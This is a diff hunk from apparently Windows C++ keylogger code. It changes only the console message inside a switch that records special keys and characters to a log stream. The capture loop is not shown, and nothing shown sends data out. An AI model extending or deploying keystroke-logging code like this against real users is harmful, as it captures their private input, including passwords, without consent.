@@ -28,44 +28,44 @@ void startLogging(){
                     case VK_BACK:
                         key = "[backspace]";
                         keys << key;
-                        std::cout << "Logged " << key << std::endl;
+                        std::cout << "Logged: " << key << std::endl;
                         break;
                     case VK_RETURN:
                         key = "[enter]";
                         keys << key;
-                        std::cout << "Logged " << key << std::endl;
+                        std::cout << "Logged: " << key << std::endl;
                         break;
                     case VK_SHIFT:
                         key = "[shift]";
                         keys << key;
-                        std::cout << "Logged " << key << std::endl;
+                        std::cout << "Logged: " << key << std::endl;
                         break;
                     case VK_CONTROL:
                         key = "[ctrl]";
                         keys << key;
-                        std::cout << "Logged " << key << std::endl;
+                        std::cout << "Logged: " << key << std::endl;
                         break;
                     case VK_CAPITAL:
                         key = "[caps]";
                         keys << key;
-                        std::cout << "Logged " << key << std::endl;
+                        std::cout << "Logged: " << key << std::endl;
                         break;
                     case VK_TAB:
                         key = "[tab]";
                         keys << key;
-                        std::cout << "Logged " << key << std::endl;
+                        std::cout << "Logged: " << key << std::endl;
                         break;
                     case VK_MENU:
                         key = "[alt]";
                         keys << key;
-                        std::cout << "Logged " << key << std::endl;
+                        std::cout << "Logged: " << key << std::endl;
                     case VK_LBUTTON:
                         break;
                     case VK_RBUTTON:
                         break; 
                     default:
                         keys << c;   
-                        std::cout << "Logged " << c << std::endl;
+                        std::cout << "Logged: " << c << std::endl;
                 }
                 
             }
